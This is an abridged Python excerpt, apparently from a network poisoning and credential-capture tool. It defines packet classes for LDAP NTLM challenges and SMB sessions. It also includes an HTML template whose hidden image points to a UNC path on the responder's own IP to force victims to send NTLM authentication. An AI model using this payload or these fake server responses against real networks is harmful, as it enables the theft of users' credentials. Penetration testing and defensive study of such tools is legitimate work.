    ...
    fields = OrderedDict(
        [
            ...
            (
                ...
                "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\"
                + RespondWithIP()
                + "\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n",
            ),
        ]
    )
...
class LDAPNTLMChallenge(Packet):
    ...
    def calculate(self):
        ...
        self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"] = (
            self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"].encode("utf-16le").decode("latin-1")
        )
        self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"] = (
            self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"].encode("utf-16le").decode("latin-1")
        )
        self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"] = (
            self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"].encode("utf-16le").decode("latin-1")
        )
        self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"] = (
            self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"].encode("utf-16le").decode("latin-1")
        )
        self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"] = (
            self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"].encode("utf-16le").decode("latin-1")
        )
        ...
        self.fields["NTLMSSPNtTargetInfoBuffOffset"] = StructWithLenPython2or3(
            "<i", len(CalculateOffsetWorkstation + str(self.fields["NTLMSSPNtWorkstationName"]))
        )
...
class SMBSession1Data(Packet):
    ...
    def calculate(self):
        ...
        self.fields["Tag1ASNIdLen"] = StructWithLenPython2or3(
            ">B",
            len(str(self.fields["Tag1ASNId2"]) + str(self.fields["Tag1ASNId2Len"]) + str(self.fields["Tag1ASNId2Str"])),
        )
